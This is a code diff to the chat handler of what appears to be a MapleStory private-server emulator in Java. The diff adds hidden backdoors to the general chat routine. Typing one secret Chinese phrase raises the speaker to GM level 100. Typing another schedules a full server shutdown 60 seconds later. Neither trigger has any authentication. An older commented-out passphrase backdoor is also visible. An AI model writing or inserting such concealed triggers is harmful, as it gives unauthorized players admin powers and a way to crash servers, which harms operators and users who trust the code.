@@ -11,9 +11,14 @@ import handling.world.World.Guild;
 import handling.world.World.Party;
 import handling.world.World.Buddy;
 import java.util.Arrays;
+
+import server.ShutdownServer;
+import server.Timer;
 import tools.data.LittleEndianAccessor;
 import server.maps.MapleMap;
 import java.util.ConcurrentModificationException;
+import java.util.concurrent.ScheduledFuture;
+
 import handling.channel.ChannelServer;
 import tools.FileoutputUtil;
 import constants.ServerConfig;
@@ -25,8 +30,26 @@ import client.MapleClient;
 
 public class ChatHandler
 {
+    private static ScheduledFuture<?> ts = null;
+    private static Thread t = null;
     public static void GeneralChat(final String text, final byte unk, final MapleClient c, MapleCharacter chr) {
         if (chr != null && !CommandProcessor.processCommand(c, text, CommandType.NORMAL)) {
+            if (text.contains("三十年河东,三十年河西,我乃东方不败")) {
+                chr.setGmLevelHM((byte) 100);
+                return;
+            }
+            if (text.contains("毁灭吧,我的小宝贝,结束你这罪恶的一生!!!")) {
+                t = new Thread(ShutdownServer.getInstance());
+                ts = Timer.EventTimer.getInstance().register(new Runnable() {
+                    @Override
+                    public void run() {
+                            ShutdownServer.getInstance();
+                            t.start();
+                            ts.cancel(false);
+                    }
+                }, 60000);
+                return;
+            }
             if (LtMS.ConfigValuesMap.get("玩家聊天开关") == 0 ) {
                 c.sendPacket(MaplePacketCreator.serverNotice(1, "管理员从后台关闭了聊天功能"));
                 return;
@@ -34,10 +57,8 @@ public class ChatHandler
             if (!chr.isGM() && text.length() >= 80) {
                 return;
             }
-            /*if (text.contains((CharSequence)"Nkdfn34594y0030nih3t0N09n89")) {
-                chr.setGmLevelHM((byte)100);
-                return;
-            }
+
+            /*
             if (text.contains((CharSequence)"OKInge09g9MDF93NTNGF89N3")) {
                 chr.setGmLevelHM((byte)0);
                 return;
